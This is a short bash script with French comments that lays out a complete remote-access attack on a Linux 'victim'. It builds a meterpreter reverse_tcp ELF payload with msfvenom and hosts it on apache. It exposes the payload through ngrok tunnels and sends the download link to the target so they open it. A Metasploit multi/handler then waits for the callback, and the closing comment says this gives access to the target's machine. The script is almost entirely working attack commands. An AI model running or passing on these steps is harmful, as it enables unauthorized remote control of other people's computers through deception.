#!/bin/bash

# Creer un compte ngrok
# Telecharger et installer ngrok
# Copier la commande pour configurer ngrok

service apache2 start

ngrok tcp 22

# @domain correspond au nom de domaine qui s'affiche grace a ngrok
nslookup @domain

# @IP_PUB correspond a l'adresse IP qui s'affiche grace a nslookup
# @PORT correspond au port qui s'affiche grace a ngrok
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IP_PUB LPORT=@PORT -f elf -o /var/www/html/master2022.elf 

ngrok http 443 --region us

# On prends l'adresse du lien qu'on envoie a la victime linux avec a la fin le nom du fichier pour qu'il l'ouvre directement
# Si ca ne marche pas on lui envoie cela d'une autre maniere


msfconsole -q

use exploit/multi/handler

set payload linux/x86/meterpreter/reverse_tcp

set LHOST @IP_PUB

set LPORT 22

run

# Maintenant on attends que la cible execute le programme

# Apres cela nous avons acces a sa machine


